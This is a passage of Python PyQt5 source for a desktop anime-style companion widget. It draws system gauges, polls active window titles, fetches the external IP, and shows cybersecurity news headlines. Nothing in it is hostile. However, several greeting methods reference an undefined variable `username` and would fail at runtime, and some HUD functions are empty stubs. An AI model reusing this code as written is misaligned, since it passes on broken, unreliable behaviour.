#!/usr/bin/env python3
# Cybernetic Holographic Assistant - V.E.N.U.S (GUI Edition)
# Designed for Umar. Integrates X11 transparency masking, BleepingComputer news, games, and terminal music control.

import os
import sys
import random
import time
import urllib.request
import subprocess
import xml.etree.ElementTree as ET
import math
import threading
import json
from PyQt5.QtWidgets import QWidget, QApplication, QLabel, QVBoxLayout, QHBoxLayout, QPushButton, QMenu, QAction, QGraphicsOpacityEffect, QLineEdit
from PyQt5.QtCore import Qt, QTimer, QPoint, QRect, QPropertyAnimation, QThread, pyqtSignal
from PyQt5.QtGui import QPixmap, QCursor, QRegion, QPainter, QPen, QColor, QRadialGradient
from PyQt5.QtNetwork import QUdpSocket, QHostAddress, QLocalServer, QLocalSocket


# Paths
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

def load_config():
    search_paths = [
        os.path.join(SCRIPT_DIR, "config.json"),
        os.path.expanduser("~/.config/venus/config.json"),
        os.path.expanduser("~/companion/config.json")
    ]
    config = {
        "username": "Umar",
        "companion_name": "Reze",
        "assets_dir": "/home/omar/companion/assets",
        "banter": [],
        "comforts": [],
        "jokes": [],
        "tips": [],
        "hack_words": [],
        "trivia_questions": [],
        "window_pokes": {}
    }
    for p in search_paths:
        if os.path.exists(p):
            try:
                with open(p, "r", encoding="utf-8") as f:
                    loaded = json.load(f)
                    config.update(loaded)
                break
            except Exception as e:
                print(f"Error loading config {p}: {e}")
    return config

# Load config data
config_data = load_config()

USERNAME = config_data.get("username", "Operator")
COMPANION_NAME = config_data.get("companion_name", "Reze")
ASSETS_DIR = config_data.get("assets_dir", "/home/omar/companion/assets")

BANTER = config_data.get("banter", [])
COMFORTS = config_data.get("comforts", [])
JOKES = config_data.get("jokes", [])
TIPS = config_data.get("tips", [])
HACK_WORDS = config_data.get("hack_words", ["BYPASS", "BUFFER", "COOKIE", "EXPLOIT", "KERNEL", "PACKET", "ROUTER", "SOCKET", "SUBNET", "TARGET"])
TRIVIA_QUESTIONS = config_data.get("trivia_questions", [])
WINDOW_POKES = config_data.get("window_pokes", {})


class StyleSheets:
    BUBBLE = """
        background-color: rgba(26, 18, 38, 0.9);
        border: 1px solid #9f52f0;
        border-radius: 12px;
        color: #ebd9fc;
        font-family: 'FiraCode Nerd Font';
        font-size: 11px;
        padding: 8px;
    """
    
    BUTTON = """
        QPushButton {
            background-color: rgba(26, 18, 38, 0.7);
            border: 1px solid #6d24be;
            border-radius: 6px;
            color: #ebd9fc;
            font-family: 'FiraCode Nerd Font';
            font-size: 10px;
            font-weight: bold;
        }
        QPushButton:hover {
            background-color: #9f52f0;
            color: #09050e;
            border: 1px solid #9f52f0;
        }
        QPushButton:pressed {
            background-color: #6d24be;
        }
    """
    
    INPUT = """
        QLineEdit {
            background-color: rgba(26, 18, 38, 0.7);
            border: 1px solid #6d24be;
            border-radius: 6px;
            color: #ebd9fc;
            font-family: 'FiraCode Nerd Font';
            font-size: 10px;
            padding-left: 6px;
        }
    """
    
    OK_BUTTON = """
        QPushButton {
            background-color: rgba(26, 18, 38, 0.7);
            border: 1px solid #6d24be;
            border-radius: 6px;
            color: #ebd9fc;
            font-family: 'FiraCode Nerd Font';
            font-size: 9px;
            font-weight: bold;
        }
        QPushButton:hover {
            background-color: #9f52f0;
            color: #09050e;
            border: 1px solid #9f52f0;
        }
    """
    
    CONTEXT_MENU = """
        QMenu {
            background-color: #160e22;
            border: 1px solid #9f52f0;
            color: #ebd9fc;
            font-family: 'FiraCode Nerd Font';
            font-size: 11px;
        }
        QMenu::item:selected {
            background-color: #9f52f0;
            color: #09050e;
        }
    """


class TypewriterLabel(QLabel):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.chars = []
        self.char_index = 0
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.typeCharacter)
        self.current_text_list = []

    def animateText(self, text, speed_ms=15):
        text = text.replace("{username}", USERNAME)
        comp_name = globals().get("COMPANION_NAME", "Reze")
        if self.parent() and hasattr(self.parent(), "companion_name"):
            comp_name = self.parent().companion_name
        text = text.replace("{companion_name}", comp_name)
        self.timer.stop()
        self.chars = list(text)
        self.char_index = 0
        self.current_text_list = []
        self.setText("")
        self.timer.start(speed_ms)

    def typeCharacter(self):
        if self.char_index < len(self.chars):
            self.current_text_list.append(self.chars[self.char_index])
            self.setText("".join(self.current_text_list))
            self.char_index += 1
        else:
            self.timer.stop()


class MetricsWorker(QThread):
    metrics_updated = pyqtSignal(float, float, float, str, str, str)
    window_category_changed = pyqtSignal(str)

    def __init__(self, parent=None):
        super().__init__(parent)
        self.running = True
        self.poll_interval = 5 # default 5s
        self.prev_total = 0
        self.prev_idle = 0
        self.local_ip = "127.0.0.1"
        self.external_ip = "Unknown"
        self.ip_fetched = False

    def run(self):
        # Fetch Local IP once
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            self.local_ip = s.getsockname()[0]
            s.close()
        except Exception:
            self.local_ip = "127.0.0.1"

        # Fetch External IP once asynchronously
        if not self.ip_fetched:
            try:
                req = urllib.request.Request("https://api.ipify.org", headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=3) as resp:
                    self.external_ip = resp.read().decode().strip()
                self.ip_fetched = True
            except Exception:
                self.external_ip = "Unknown"

        last_window_category = None
        last_poke_time = 0

        while self.running:
            cpu = 0.0
            ram = 0.0
            battery = 100.0
            bat_status = "Unknown"

            # CPU
            try:
                with open('/proc/stat', 'r') as f:
                    line = f.readline()
                parts = line.split()
                times = [int(x) for x in parts[1:8]]
                idle = times[3] + times[4]
                total = sum(times)
                if self.prev_total > 0:
                    diff_total = total - self.prev_total
                    diff_idle = idle - self.prev_idle
                    if diff_total > 0:
                        cpu = 100.0 * (diff_total - diff_idle) / diff_total
                self.prev_total = total
                self.prev_idle = idle
            except Exception:
                pass

            # RAM
            try:
                with open('/proc/meminfo', 'r') as f:
                    mem = f.readlines()
                total_m = int(mem[0].split()[1])
                free_m = int(mem[1].split()[1])
                used_m = total_m - free_m
                ram = (used_m / total_m) * 100.0
            except Exception:
                pass

            # Battery
            try:
                if os.path.exists('/sys/class/power_supply/BAT0/capacity'):
                    with open('/sys/class/power_supply/BAT0/capacity', 'r') as bf:
                        battery = float(bf.read().strip())
                if os.path.exists('/sys/class/power_supply/BAT0/status'):
                    with open('/sys/class/power_supply/BAT0/status', 'r') as bs:
                        bat_status = bs.read().strip()
            except Exception:
                pass

            self.metrics_updated.emit(cpu, ram, battery, bat_status, self.local_ip, self.external_ip)

            # Active window title check via xdotool
            current_time = time.time()
            if current_time - last_poke_time > 8:
                try:
                    window_id = subprocess.check_output(["xdotool", "getactivewindow"], stderr=subprocess.DEVNULL).decode().strip()
                    title = subprocess.check_output(["xdotool", "getwindowname", window_id], stderr=subprocess.DEVNULL).decode().strip()
                except Exception:
                    title = ""
                
                if title:
                    title_lower = title.lower()
                    category = "other"
                    if "youtube" in title_lower:
                        category = "youtube"
                    elif any(term in title_lower for term in ["alacritty", "kitty", "terminal", "tmux", "bash", "zsh"]):
                        category = "terminal"
                    elif any(term in title_lower for term in ["visual studio code", "vscode", "vsc", "neovim", "nvim", "vim", "emacs"]):
                        category = "code"
                    elif any(term in title_lower for term in ["hack the box", "htb", "tryhackme", "thm", "portswigger"]):
                        category = "ctf"
                    elif any(term in title_lower for term in ["firefox", "chrome", "chromium", "browser", "google search"]):
                        category = "browser"
                    
                    if category != last_window_category and category != "other":
                        last_window_category = category
                        self.window_category_changed.emit(category)
                        last_poke_time = current_time

            # Sleep in 100ms segments to remain responsive to close events
            for _ in range(int(self.poll_interval * 10)):
                if not self.running:
                    break
                self.msleep(100)


class VenusCompanion(QWidget):
    def __init__(self):
        super().__init__()
        self.current_cpu_load = 5.0
        self.current_ram_percent = 25.0
        self.current_battery_percent = 100.0
        self.battery_status = "Unknown"
        self.local_ip = "127.0.0.1"
        self.external_ip = "Unknown"
        self.audio_peak = 0.0
        self.visualizer_level = 0.0
        self.visualizer_rotation = 0.0
        self.hud_rotation_angle = 0.0
        self.hud_opacity = 1.0
        self.hud_target_opacity = 1.0
        
        # Pre-allocated drawing resources for optimal performance
        num_bars = 48
        self.bar_colors = []
        for i in range(num_bars):
            t = i / num_bars
            if t < 0.5:
                t2 = t * 2.0
                r = int(159 * (1 - t2) + 0 * t2)
                g = int(82 * (1 - t2) + 220 * t2)
                b = int(240 * (1 - t2) + 255 * t2)
            else:
                t2 = (t - 0.5) * 2.0
                r = int(0 * (1 - t2) + 255 * t2)
                g = int(220 * (1 - t2) + 42 * t2)
                b = int(255 * (1 - t2) + 133 * t2)
            self.bar_colors.append(QColor(r, g, b))
            
        self.bar_factors = [i * 0.4 for i in range(num_bars)]
        self.bg_dash_pen = QPen(Qt.transparent, 1, Qt.DashLine)
        self.gauge_pen = QPen(Qt.transparent, 3)
        self.bar_pen = QPen(Qt.transparent, 2)
        
        self.cpu_color = QColor(159, 82, 240)
        self.ram_color = QColor(0, 220, 255)
        self.bat_color = QColor(255, 42, 133)

        self.hud_fade_timer = QTimer(self)
        self.hud_fade_timer.timeout.connect(self.updateHUDFade)
        self.sys_active = False
        self.loadSaveData()
        self.initUI()
        
    def loadSaveData(self):
        self.affinity = 0
        self.quiz_high_score = 0
        self.character = "reze"
        self.companion_name = "Reze"
        self.stored_memory = "No notes saved yet."
        
        save_path = os.path.expanduser("~/.config/venus_save.txt")
        if os.path.exists(save_path):
            try:
                with open(save_path, "r", encoding="utf-8") as f:
                    lines = [line.strip() for line in f.readlines()]
                    if len(lines) > 0:
                        self.affinity = int(lines[0])
                    if len(lines) > 1:
                        self.quiz_high_score = int(lines[1])
                    if len(lines) > 2 and lines[2] in ["reze", "lara", "lucy"]:
                        self.character = lines[2]
                    if len(lines) > 3 and lines[3]:
                        self.companion_name = lines[3]
                    if len(lines) > 4 and lines[4]:
                        self.stored_memory = lines[4]
            except Exception:
                pass

    def saveSaveData(self):
        # Save data asynchronously in a background thread to prevent UI freezing (Suggestion 11)
        save_path = os.path.expanduser("~/.config/venus_save.txt")
        affinity = self.affinity
        quiz_high_score = self.quiz_high_score
        character = self.character
        companion_name = self.companion_name
        stored_memory = self.stored_memory

        def worker():
            try:
                os.makedirs(os.path.dirname(save_path), exist_ok=True)
                with open(save_path, "w", encoding="utf-8") as f:
                    f.write(f"{affinity}\n")
                    f.write(f"{quiz_high_score}\n")
                    f.write(f"{character}\n")
                    f.write(f"{companion_name}\n")
                    f.write(f"{stored_memory}\n")
            except Exception:
                pass

        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()

    def getAffinityRank(self):
        if self.affinity < 10:
            return "Stranger"
        elif self.affinity < 30:
            return "Hacking Partner"
        elif self.affinity < 60:
            return "Charming Accomplice"
        elif self.affinity < 100:
            return "Root Guardian"
        else:
            return "Cyber Soulmate"

    def loadCharacterPixmap(self, char_name, filename):
        char_path = os.path.join(ASSETS_DIR, char_name, filename)
        if os.path.exists(char_path):
            pix = QPixmap(char_path)
            if not pix.isNull():
                return pix.scaled(220, 220, Qt.KeepAspectRatio, Qt.SmoothTransformation)
        fallback_path = os.path.join(ASSETS_DIR, "reze", filename)
        if os.path.exists(fallback_path):
            pix = QPixmap(fallback_path)
            if not pix.isNull():
                return pix.scaled(220, 220, Qt.KeepAspectRatio, Qt.SmoothTransformation)
        return QPixmap()

    def updateCharacterAssets(self):
        # Garbage collect old asset references to reclaim RAM (Suggestion 9)
        self.pixmap_idle = None
        self.pixmap_wink = None
        self.pixmap_blush = None
        self.pixmap_shower = None
        self.pixmap_shower_two = None
        self.pixmap_hacking = None
        self.pixmap_coffee = None
        self.pixmap_sleep = None
        self.pixmap_celebrate = None
        self.pixmap_makeup = None
        self.pixmap_eating = None

        # Load and scale once during switch to avoid dynamic disk reads (Suggestion 3)
        self.pixmap_idle = self.loadCharacterPixmap(self.character, "idle.png")
        self.pixmap_wink = self.loadCharacterPixmap(self.character, "wink.png")
        self.pixmap_blush = self.loadCharacterPixmap(self.character, "blush.png")
        self.pixmap_shower = self.loadCharacterPixmap(self.character, "shower.png")
        self.pixmap_shower_two = self.loadCharacterPixmap(self.character, "shower_two.png")
        self.pixmap_hacking = self.loadCharacterPixmap(self.character, "hacking.png")
        self.pixmap_coffee = self.loadCharacterPixmap(self.character, "coffee.png")
        self.pixmap_sleep = self.loadCharacterPixmap(self.character, "sleep.png")
        self.pixmap_celebrate = self.loadCharacterPixmap(self.character, "celebrate.png")
        self.pixmap_makeup = self.loadCharacterPixmap(self.character, "makeup.png")
        self.pixmap_eating = self.loadCharacterPixmap(self.character, "eating.png")

    def initUI(self):
        self.setWindowTitle("AI Companion")
        self.setWindowFlags(
            Qt.Tool |
            Qt.FramelessWindowHint | 
            Qt.WindowStaysOnTopHint
        )
        self.setAttribute(Qt.WA_TranslucentBackground)
        
        self.updateCharacterAssets()
        
        layout = QVBoxLayout()
        layout.setContentsMargins(10, 10, 10, 10)
        layout.setSpacing(6)
        
        self.bubble = TypewriterLabel()
        self.bubble.setWordWrap(True)
        self.bubble.setStyleSheet(StyleSheets.BUBBLE)
        self.bubble.setFixedWidth(230)
        self.bubble.setFixedHeight(105)
        layout.addWidget(self.bubble, alignment=Qt.AlignHCenter)
        
        self.buttons_widget = QWidget()
        self.buttons_widget.setFixedWidth(230)
        self.buttons_widget.setFixedHeight(30)
        btn_layout = QHBoxLayout()
        btn_layout.setContentsMargins(0, 0, 0, 0)
        btn_layout.setSpacing(4)
        
        self.btn_1 = QPushButton("💡 Talk")
        self.btn_2 = QPushButton("📊 Sys")
        self.btn_3 = QPushButton("🎮 Game")
        self.btn_4 = QPushButton("📰 News")
        
        for btn in [self.btn_1, self.btn_2, self.btn_3, self.btn_4]:
            btn.setStyleSheet(StyleSheets.BUTTON)
            btn_layout.addWidget(btn)
        
        self.btn_1.clicked.connect(self.handleButton1)
        self.btn_2.clicked.connect(self.handleButton2)
        self.btn_3.clicked.connect(self.handleButton3)
        self.btn_4.clicked.connect(self.handleButton4)
        
        self.buttons_widget.setLayout(btn_layout)
        layout.addWidget(self.buttons_widget, alignment=Qt.AlignHCenter)
        
        self.input_widget = QWidget()
        self.input_widget.setFixedWidth(230)
        self.input_widget.setFixedHeight(30)
        input_layout = QHBoxLayout()
        input_layout.setContentsMargins(0, 0, 0, 0)
        input_layout.setSpacing(4)
        
        self.input_field = QLineEdit()
        self.input_field.setPlaceholderText("Command V.E.N.U.S (e.g. play, news)...")
        self.input_field.setStyleSheet(StyleSheets.INPUT)
        
        self.input_ok_btn = QPushButton("OK")
        self.input_ok_btn.setFixedWidth(40)
        self.input_ok_btn.setStyleSheet(StyleSheets.OK_BUTTON)
        
        input_layout.addWidget(self.input_field)
        input_layout.addWidget(self.input_ok_btn)
        self.input_widget.setLayout(input_layout)
        layout.addWidget(self.input_widget, alignment=Qt.AlignHCenter)
        
        self.input_ok_btn.clicked.connect(self.handleInputSubmit)
        self.input_field.returnPressed.connect(self.handleInputSubmit)
        
        self.mascot = QLabel()
        self.mascot.setPixmap(self.pixmap_idle)
        layout.addWidget(self.mascot, alignment=Qt.AlignHCenter)
        
        self.opacity_effect = QGraphicsOpacityEffect(self.mascot)
        self.mascot.setGraphicsEffect(self.opacity_effect)
        self.fade_anim = QPropertyAnimation(self.opacity_effect, b"opacity")
        self.fade_anim.setDuration(300)
        
        self.setLayout(layout)
        self.setFixedSize(250, 425)
        
        screen = QApplication.primaryScreen().geometry()
        self.move(screen.width() - 270, screen.height() - 480)
        
        self.setMouseTracking(True)
        self.mascot.setMouseTracking(True)
        
        self.updateMask()
        
        self.idle_timer = QTimer(self)
        self.idle_timer.setSingleShot(True)
        self.idle_timer.timeout.connect(self.restoreIdle)
        
        self.game_mode = None
        self.secret_word = ""
        self.hack_options = []
        
        self.trivia_index = 0
        self.trivia_score = 0
        self.trivia_current_q = None
        
        self.input_mode = None
        self.is_bathing = False
        self.high_load_active = False
        
        self.glitch_timer = None
        self.glitch_ticks = 0
        self.glitch_target_pixmap = None
        
        # Async metrics worker thread (Suggestion 1)
        self.metrics_worker = MetricsWorker(self)
        self.metrics_worker.metrics_updated.connect(self.handleMetricsUpdated)
        self.metrics_worker.window_category_changed.connect(self.handleWindowCategoryChanged)
        self.metrics_worker.start()
        
        self.pwn_timer = QTimer(self)
        self.pwn_timer.timeout.connect(self.checkPwnTrigger)
        self.pwn_timer.start(1000)
        
        self.session_start = time.time()
        self.hour_alert_done = False
        
        # Setup UDP socket for visualizer audio data
        self.udp_socket = QUdpSocket(self)
        self.udp_socket.bind(QHostAddress.LocalHost, 54322)
        
        self.anim_timer = QTimer(self)
        self.anim_timer.timeout.connect(self.updateAnimFrame)
        self.anim_timer.start(45)
        
        self.oldPos = QPoint()
        
        QTimer.singleShot(1000, self.showStartupNews)

    def enterEvent(self, event):
        super().enterEvent(event)
        # Fast system polling when interactive
        self.metrics_worker.poll_interval = 5
        
    def leaveEvent(self, event):
        super().leaveEvent(event)
        # Reduce metric polling when idle/minimized to save CPU (Suggestion 4)
        self.metrics_worker.poll_interval = 10
        
    def showEvent(self, event):
        # Limit/Resume animation timer events based on visibility (Suggestion 6)
        self.anim_timer.start(45)
        super().showEvent(event)
        QTimer.singleShot(100, self.updateMask)

    def hideEvent(self, event):
        # Stop animation timer when minimized to save CPU (Suggestion 6)
        self.anim_timer.stop()
        super().hideEvent(event)
        
    def fadeHUD(self, show_hud):
        pass
            
    def updateHUDFade(self):
        pass
        
    def checkHUDFadeOut(self):
        pass

    def updateAnimFrame(self):
        if self.udp_socket.state() == 4:
            while self.udp_socket.hasPendingDatagrams():
                datagram, host, port = self.udp_socket.readDatagram(self.udp_socket.pendingDatagramSize())
                try:
                    peak_val = float(datagram.decode().strip())
                    self.audio_peak = peak_val
                except Exception:
                    pass
                
        if self.hud_opacity > 0.01:
            self.visualizer_rotation = (self.visualizer_rotation + 1.5) % 360
            self.hud_rotation_angle = (self.hud_rotation_angle + 0.8) % 360
            self.audio_peak = max(self.audio_peak - 400.0, 0.0)
            
            # Keep margins static as per user request
            if not self.is_bathing:
                self.mascot.setContentsMargins(10, 0, 10, 0)
                    
            self.update()

    def paintEvent(self, event):
        opacity = self.hud_opacity
        if opacity <= 0.01:
            return
            
        painter = QPainter(self)
        painter.setRenderHint(QPainter.Antialiasing)
        
        mascot_geom = self.mascot.geometry()
        if not mascot_geom.isValid():
            cx, cy = 125, 290
        else:
            cx = mascot_geom.x() + mascot_geom.width() // 2
            cy = mascot_geom.y() + mascot_geom.height() // 2
            
        # Draw floating circular gauges (CPU, RAM, Battery) around mascot
        base_cpu_alpha = int(40 * opacity)
        arc_cpu_alpha = int(180 * opacity)
        base_ram_alpha = int(45 * opacity)
        arc_ram_alpha = int(180 * opacity)
        base_bat_alpha = int(40 * opacity)
        arc_bat_alpha = int(180 * opacity)
        
        cpu_load = self.current_cpu_load
        ram_pct = self.current_ram_percent
        bat_pct = self.current_battery_percent
        bat_status = self.battery_status
        rotation_angle = self.hud_rotation_angle
        
        # Dynamic HUD scaling based on CPU load (Suggestion 20)
        cpu_pulse = 1.0 + (cpu_load / 100.0) * 0.08
        if self.high_load_active:
            cpu_pulse += 0.04 * math.sin(time.time() * 10.0)
            
        # Radial holographic background gradient (Suggestion 21)
        radial_grad = QRadialGradient(cx, cy, 120 * cpu_pulse)
        radial_grad.setColorAt(0.0, QColor(159, 82, 240, int(25 * opacity)))
        radial_grad.setColorAt(0.6, QColor(0, 220, 255, int(15 * opacity)))
        radial_grad.setColorAt(1.0, QColor(0, 0, 0, 0))
        painter.setBrush(radial_grad)
        painter.setPen(Qt.NoPen)
        painter.drawEllipse(QPoint(cx, cy), int(120 * cpu_pulse), int(120 * cpu_pulse))
        
        # 1. CPU Arc
        if cpu_load > 85.0:
            self.cpu_color.setRgb(255, 30, 30, arc_cpu_alpha)
        else:
            self.cpu_color.setRgb(159, 82, 240, arc_cpu_alpha)
            
        self.bg_dash_pen.setColor(QColor(159, 82, 240, base_cpu_alpha))
        painter.setPen(self.bg_dash_pen)
        painter.drawEllipse(QPoint(cx, cy), int(105 * cpu_pulse), int(105 * cpu_pulse))
        
        cpu_val = int(cpu_load * 3.6 * 16)
        cpu_start_angle = int((90 - rotation_angle) * 16)
        self.gauge_pen.setColor(self.cpu_color)
        self.gauge_pen.setWidth(3)
        painter.setPen(self.gauge_pen)
        painter.drawArc(cx - int(105 * cpu_pulse), cy - int(105 * cpu_pulse), int(210 * cpu_pulse), int(210 * cpu_pulse), cpu_start_angle, -cpu_val)
        
        # 2. RAM Arc
        self.ram_color.setRgb(0, 220, 255, arc_ram_alpha)
        self.bg_dash_pen.setColor(QColor(0, 220, 255, base_ram_alpha))
        painter.setPen(self.bg_dash_pen)
        painter.drawEllipse(QPoint(cx, cy), int(95 * cpu_pulse), int(95 * cpu_pulse))
        
        ram_val = int(ram_pct * 3.6 * 16)
        ram_start_angle = int((90 + rotation_angle) * 16)
        self.gauge_pen.setColor(self.ram_color)
        self.gauge_pen.setWidth(3)
        painter.setPen(self.gauge_pen)
        painter.drawArc(cx - int(95 * cpu_pulse), cy - int(95 * cpu_pulse), int(190 * cpu_pulse), int(190 * cpu_pulse), ram_start_angle, ram_val)
        
        # 3. Battery Arc
        if bat_status == "Charging":
            self.bat_color.setRgb(50, 220, 50, arc_bat_alpha)
        elif bat_pct < 20:
            self.bat_color.setRgb(255, 30, 30, arc_bat_alpha)
        else:
            self.bat_color.setRgb(255, 42, 133, arc_bat_alpha)
            
        self.bg_dash_pen.setColor(QColor(255, 42, 133, base_bat_alpha))
        painter.setPen(self.bg_dash_pen)
        painter.drawEllipse(QPoint(cx, cy), int(85 * cpu_pulse), int(85 * cpu_pulse))
        
        bat_val = int(bat_pct * 3.6 * 16)
        bat_start_angle = int((270 - rotation_angle * 1.5) * 16)
        self.gauge_pen.setColor(self.bat_color)
        self.gauge_pen.setWidth(2)
        painter.setPen(self.gauge_pen)
        painter.drawArc(cx - int(85 * cpu_pulse), cy - int(85 * cpu_pulse), int(170 * cpu_pulse), int(170 * cpu_pulse), bat_start_angle, -bat_val)
        
        # 4. Audio Visualizer ring
        norm_peak = min(self.audio_peak / 15000.0, 1.0)
        self.visualizer_level = 0.85 * self.visualizer_level + 0.15 * norm_peak
        self.visualizer_level = max(self.visualizer_level - 0.015, 0.0)
        
        num_bars = 48
        min_r = int(68 * cpu_pulse)
        max_add_r = int(18 * cpu_pulse)
        
        painter.save()
        painter.translate(cx, cy)
        painter.rotate(self.visualizer_rotation)
        
        angle_step = 360.0 / num_bars
        current_time_sec = time.time()
        alpha = int(190 * opacity * (0.2 + 0.8 * self.visualizer_level))
        
        # Use local variables inside visualizer loop for speed optimization (Suggestion 14)
        factors = self.bar_factors
        colors = self.bar_colors
        for i in range(num_bars):
            painter.rotate(angle_step)
            wave_factor = 0.4 + 0.6 * math.sin(factors[i] + current_time_sec * 6.0)
            length = min_r + max_add_r * self.visualizer_level * wave_factor
            
            color = colors[i]
            color.setAlpha(alpha)
            self.bar_pen.setColor(color)
            painter.setPen(self.bar_pen)
            painter.drawLine(min_r, 0, int(length), 0)
            
        painter.restore()

    def updateMask(self):
        combined = QRegion()
        
        # 1. Bubble
        bubble_geom = self.bubble.geometry()
        if bubble_geom.isValid():
            combined = combined.united(QRegion(bubble_geom))
            
        # 2. Buttons
        if self.buttons_widget.isVisible():
            buttons_geom = self.buttons_widget.geometry()
            if buttons_geom.isValid():
                combined = combined.united(QRegion(buttons_geom))
                
        # 3. Input Widget
        if self.input_widget.isVisible():
            input_geom = self.input_widget.geometry()
            if input_geom.isValid():
                combined = combined.united(QRegion(input_geom))
                
        # 4. Mascot
        mascot_geom = self.mascot.geometry()
        if mascot_geom.isValid():
            if self.mascot.pixmap() and not self.mascot.pixmap().isNull():
                mask = self.mascot.pixmap().mask()
                mascot_region = QRegion(mask).translated(mascot_geom.x(), mascot_geom.y())
                combined = combined.united(mascot_region)
            else:
                combined = combined.united(QRegion(mascot_geom))
                
        # 5. Gauges region
        if self.hud_opacity > 0.01 and mascot_geom.isValid():
            cx = mascot_geom.x() + mascot_geom.width() // 2
            cy = mascot_geom.y() + mascot_geom.height() // 2
            gauges_geom = QRect(cx - 110, cy - 110, 220, 220)
            combined = combined.united(QRegion(gauges_geom))
            
        self.setMask(combined)

    def applyGlitchEffect(self, pixmap, intensity):
        if pixmap is None or pixmap.isNull():
            return pixmap
            
        glitched = QPixmap(pixmap.size())
        glitched.fill(Qt.transparent)
        
        painter = QPainter(glitched)
        painter.setRenderHint(QPainter.Antialiasing)
        
        w, h = pixmap.width(), pixmap.height()
        
        # Slices loop: limit max slices to 4 (Suggestion 12)
        num_slices = random.randint(2, 4)
        prev_y = 0
        for _ in range(num_slices):
            slice_h = random.randint(10, h // num_slices)
            curr_y = min(prev_y + slice_h, h)
            if curr_y <= prev_y:
                break
                
            offset_x = random.randint(-int(12 * intensity), int(12 * intensity)) if random.random() < 0.6 else 0
            
            src_rect = QRect(0, prev_y, w, curr_y - prev_y)
            dest_rect = QRect(offset_x, prev_y, w, curr_y - prev_y)
            
            painter.drawPixmap(dest_rect, pixmap, src_rect)
            prev_y = curr_y
            
        if prev_y < h:
            painter.drawPixmap(QRect(0, prev_y, w, h - prev_y), pixmap, QRect(0, prev_y, w, h - prev_y))
            
        # Colored Glitch Bars
        if random.random() < 0.8:
            cyan_y = random.randint(10, h - 20)
            cyan_h = random.randint(3, 10)
            painter.setPen(Qt.NoPen)
            painter.setBrush(QColor(0, 220, 255, int(100 * intensity)))
            painter.drawRect(random.randint(-10, 10), cyan_y, w + 20, cyan_h)
            
            magenta_y = random.randint(10, h - 20)
            magenta_h = random.randint(3, 10)
            painter.setBrush(QColor(255, 42, 133, int(100 * intensity)))
            painter.drawRect(random.randint(-10, 10), magenta_y, w + 20, magenta_h)
            
        # Scanlines
        scan_pen = QPen(QColor(0, 0, 0, int(45 * intensity)), 1)
        painter.setPen(scan_pen)
        for y in range(0, h, 3):
            painter.drawLine(0, y, w, y)
            
        painter.end()
        return glitched

    def changePose(self, pixmap):
        if pixmap is None or pixmap.isNull():
            return
            
        self.glitch_target_pixmap = pixmap
        self.glitch_ticks = 0
        self.fadeHUD(True)
        
        self.glitch_timer = QTimer(self)
        self.glitch_timer.timeout.connect(self.playGlitchTick)
        self.glitch_timer.start(40)

    def playGlitchTick(self):
        self.glitch_ticks += 1
        if self.glitch_ticks <= 6:
            intensity = (7 - self.glitch_ticks) / 6.0
            
            base_pixmap = self.glitch_target_pixmap if self.glitch_ticks % 2 == 0 else self.pixmap_idle
            glitched = self.applyGlitchEffect(base_pixmap, intensity)
            
            self.mascot.setPixmap(glitched)
            dx = random.randint(-6, 6)
            dy = random.randint(-6, 6)
            self.mascot.setContentsMargins(dx + 10, dy, 10 - dx, 0)
            self.opacity_effect.setOpacity(random.uniform(0.4, 0.9))
        else:
            self.glitch_timer.stop()
            self.mascot.setPixmap(self.glitch_target_pixmap)
            self.mascot.setContentsMargins(10, 0, 10, 0)
            self.updateMask()
            
            self.fade_anim.stop()
            self.fade_anim.setStartValue(self.opacity_effect.opacity())
            self.fade_anim.setEndValue(1.0)
            self.fade_anim.start()
            
            QTimer.singleShot(1500, self.checkHUDFadeOut)

    def restoreIdle(self):
        if not self.is_bathing and self.game_mode is None and self.input_mode is None:
            current_hour = time.localtime().tm_hour
            if current_hour >= 22 or current_hour < 5:
                self.changePose(self.pixmap_sleep)
                self.bubble.animateText(f"💤 [{self.companion_name} - Night Mode]\nSleepy yawning, but standing guard for you, {username}...")
            else:
                self.changePose(self.pixmap_idle)
                self.bubble.animateText(f"Monitoring environment... Ready, {username}.")

    def restoreButtons(self):
        self.game_mode = None
        self.input_mode = None
        self.btn_1.setText("💡 Talk")
        self.btn_2.setText("📊 Sys")
        self.btn_3.setText("🎮 Game")
        self.btn_4.setText("📰 News")
        self.btn_1.setEnabled(True)
        self.btn_2.setEnabled(True)
        self.btn_3.setEnabled(True)
        self.btn_4.setEnabled(True)
        self.buttons_widget.show()
        self.restoreIdle()

    def showStartupNews(self):
        current_hour = time.localtime().tm_hour
        if 5 <= current_hour < 12:
            greeting = f"Good morning, {username}! ☕ Grab some coffee. {self.companion_name} is online!"
        elif 12 <= current_hour < 17:
            greeting = f"Good afternoon, {username}! 💻 Focus is high. What are we scanning today?"
        elif 17 <= current_hour < 22:
            greeting = f"Good evening, {username}! 🌆 Ready for some cybersecurity practice?"
        else:
            self.changePose(self.pixmap_sleep)
            greeting = f"Late-night session, {username}? 🌙 *Yawn*... I'm staying awake with you."
            
        self.bubble.animateText(greeting)
        QTimer.singleShot(5000, self.loadRSS)

    def loadRSS(self):
        try:
            url = "https://www.bleepingcomputer.com/feed/"
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'})
            with urllib.request.urlopen(req, timeout=5) as response:
                xml_data = response.read()
            root = ET.fromstring(xml_data)
            titles = []
            for item in root.findall('.//item')[:2]:
                title = item.find('title').text
                if len(title) > 65:
                    title = title[:62] + "..."
                titles.append(title)
            
            feed_text = "📰 [BleepingComputer News]:\n" + "\n• ".join(titles)
            self.bubble.animateText(feed_text)
        except Exception:
            self.bubble.animateText(f"Connected. Environment safe. Ready to assist you, {username}.")

    def handleMetricsUpdated(self, cpu, ram, battery, bat_status, local_ip, external_ip):
        self.current_cpu_load = cpu
        self.current_ram_percent = ram
        self.current_battery_percent = battery
        self.battery_status = bat_status
        self.local_ip = local_ip
        self.external_ip = external_ip
        
        # 1. 1-Hour Session Check
        elapsed = time.time() - self.session_start
        if elapsed >= 3600 and not self.hour_alert_done:
            self.hour_alert_done = True
            self.changePose(self.pixmap_coffee)
